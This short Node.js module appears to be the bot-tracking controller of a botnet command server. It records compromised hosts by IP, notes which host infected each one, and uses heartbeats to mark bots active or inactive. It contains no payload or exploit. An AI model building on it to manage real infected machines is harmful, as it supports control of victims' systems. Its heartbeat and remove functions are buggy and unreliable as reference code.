const moment = require('moment')
const debug = require('debug')('server:bots-controller')
const chalk = require('chalk')

// BOT model
let bot = {
  ip: '',
  lastHeartbeat: '',
  infectedByIp: '',
  active: true
}

let bots = []

function getBots() {
  var now = moment()
  // debug('now: ', now)
  var check = moment().subtract(1, "minutes")
  // debug('check: ', check)
  bots.forEach(bot => {
    if (moment(bot.lastHeartbeat).isBefore(check)){
      bot.active = false
    }
  })
  return bots
}

function add(bot) {
  let exists = bots.find(b => b.ip === bot.ip)
  if (exists) {
    debug(`${chalk.redBright('Bot already exists')}`)
    return false
  } else {
    bot.lastHeartbeat = moment()
    bot.active = true
    // debug(bot)
    bots.push(bot)
    debug(`New Bot': ${chalk.green(bot.ip)}`)
    debug(`Count: ${bots.length}`)
    // debug(bots)
    return true
  }
}

// updates bot.lastHeartbeat (DATE / TIME)
function heartbeat(ip) {
  let i = bots.findIndex(b => b.ip === ip)
  bots[i].lastHeartbeat = moment()
  bots[i].isActive = true
  return bot[i]
}

function remove(ip) {
  return bots.filter(b => b.ip !== ip)
}

module.exports ={ getBots, add, heartbeat, remove}